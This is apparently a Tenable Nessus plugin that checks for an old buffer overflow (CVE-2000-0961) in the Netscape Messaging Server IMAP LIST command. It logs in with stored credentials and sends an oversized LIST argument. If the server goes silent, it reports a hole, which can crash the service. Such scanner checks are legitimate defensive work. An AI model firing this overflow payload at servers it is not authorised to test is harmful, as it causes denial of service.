#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10580);
  script_version ("$Revision: 1.20 $");
  script_cve_id("CVE-2000-0961");
  script_bugtraq_id(1721);
  script_osvdb_id(478);

  script_name(english:"Netscape Messaging Server IMAP LIST Command Remote Overflow");
  script_summary(english:"Checks for a buffer overflow in imapd");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"There is a buffer overflow in the remote imap server
which allows an authenticated user to obtain a remote
shell. A way to reproduce the overflow is to issue the command :

  list AAAAA...AAAA /"
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade your imap server or use another one."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

  script_set_attribute(
    attribute:'see_also',
    value:'http://seclists.org/bugtraq/2000/Sep/471'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/12/19");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/09/26");
 script_cvs_date("$Date: 2016/11/23 20:31:33 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:netscape:messaging_server");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:netscape:netscape_messaging_server_multiplexor");
  script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "logins.nasl");
 script_require_ports("Services/imap", 143);
 script_require_keys("imap/login", "imap/password");
 script_exclude_keys("imap/false_imap");

 exit(0);
}

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

if((acct == "")||(pass == ""))exit(0);

port = get_kb_item("Services/imap");
if(!port)port = 143;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 b = recv_line(socket:soc, length:1024);
 if(!strlen(b)){
 	close(soc);
	exit(0);
	}
 s1 = string("1 login ", acct, " ", pass, "\r\n");
 send(socket:soc, data:s1);
 b = recv_line(socket:soc, length:1024);

 s2 = string("1 list ", crap(4096), " /\r\n");
 send(socket:soc, data:s2);
 c = recv_line(socket:soc, length:1024);
 if(strlen(c) == 0)security_hole(port);
 close(soc);
}
